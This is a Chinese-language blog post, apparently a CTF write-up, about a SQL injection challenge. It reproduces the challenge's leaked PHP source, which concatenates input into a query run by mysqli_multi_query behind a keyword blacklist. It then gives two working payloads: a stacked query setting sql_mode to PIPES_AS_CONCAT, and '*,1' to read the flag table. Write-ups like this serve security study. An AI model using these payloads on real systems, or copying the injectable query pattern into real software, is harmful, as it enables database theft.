@@ -1,0 +1,140 @@
+---
+layout: post
+title:  "2019-11-22-03"
+description: 再浪漫的爱情，不能相濡以沫，相伴到老，也是遗憾的
+date:   2019-11-22
+tags: waf绕过 堆叠注入 sql注入骚知识
+excerpt_separator: ~~~
+---
+1.堆叠注入(+1)
+
+2.show的使用(+1)
+
+3.涉及||的sql查询与绕过
+
+~~~
+通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||
+
+根据输入的回显大致判断查询语句为：.. POST['query']||flag ...
+
+(如果是:```select 输入值 || flag from Flag```,是数字就返回真,就不会执行后面的语句,是其他字符就返回假,就执行后面的语句,但后面的语句```flag from Flag```无法执行,这里的||相当于or)
+
+(可以试下输入false和true,即可验证上述说法.若select false or flag from Flag-------select false无输出,返回为假,执行后面语句,但后面语句执行为空白,所以返回空白页面)
+
+也就是select 输入的数据||内置的一个列名 from 表名
+
+进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag
+
+![My helpful screenshot](/assets/img/2019-11-22-03/1.png)
+
+进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)
+
+源码(网站泄露出来的,本身题目不带有,学学过滤规则还是挺好的,而且还限制了输入长度为40)
+```php
+<?php
+    session_start();
+
+    include_once "config.php";
+
+    $post = array();
+    $get = array();
+    global $MysqlLink;
+
+    //GetPara();
+    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
+    if(!$MysqlLink){
+        die("Mysql Connect Error!");
+    }
+    $selectDB = mysqli_select_db($MysqlLink,$dataName);
+    if(!$selectDB){
+        die("Choose Database Error!");
+    }
+
+    foreach ($_POST as $k=>$v){
+        if(!empty($v)&&is_string($v)){
+            $post[$k] = trim(addslashes($v));
+        }
+    }
+    foreach ($_GET as $k=>$v){
+        }
+    }
+    //die();
+    ?>
+
+<html>
+<head>
+</head>
+
+<body>
+
+<a> Give me your flag, I will tell you if the flag is right. </ a>
+<form action="" method="post">
+<input type="text" name="query">
+<input type="submit">
+</form>
+</body>
+</html>
+
+<?php
+
+    if(isset($post['query'])){
+        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\"";
+        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
+        if(preg_match("/{$BlackList}/is",$post['query'])){
+            //echo $post['query'];
+            die("Nonono.");
+        }
+        if(strlen($post['query'])>40){
+            die("Too long.");
+        }
+        $sql = "select ".$post['query']."||flag from Flag";
+        mysqli_multi_query($MysqlLink,$sql);
+        do{
+            if($res = mysqli_store_result($MysqlLink)){
+                while($row = mysqli_fetch_row($res)){
+                    print_r($row);
+                }
+            }
+        }while(@mysqli_next_result($MysqlLink));
+
+    }
+
+    ?>
+```
+## 有两种解法
+一种是预期解
+
+通过堆叠注入设置sql_mode的值为PIPES_AS_CONCAT
+```
+1;set sql_mode=PIPES_AS_CONCAT;select 1
+```
+设置sql_mode为PIPES_AS_CONCAT后可改变'||'的含义为连接字符串
+```
+在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能
+```
+原语句中||的含义为或运算，当前面一个字段查询到数据时，就不会再执行（我的理解是这样）。改变语义后就是将前一个字段的查询结果和后一个字段查询结果进行拼接。这样两个字段都会被查询
+
+构造payload：
+```
+1;set sql_mode=PIPES_AS_CONCAT;select 1
+```
+![My helpful screenshot](/assets/img/2019-11-22-03/2.png)
+
+另一种是非预期解，直接构造payload
+```
+*,1
+```
+原sql语句变为
+```
+select *,1||flag from Flag
+```
+而*号为查询所有数据，即实现了对flag的查询
+
+![My helpful screenshot](/assets/img/2019-11-22-03/3.png)
+
+## 知识点:
+1.堆叠注入(+1)
+
+2.show的使用(+1)
+
+3.涉及||的sql查询与绕过
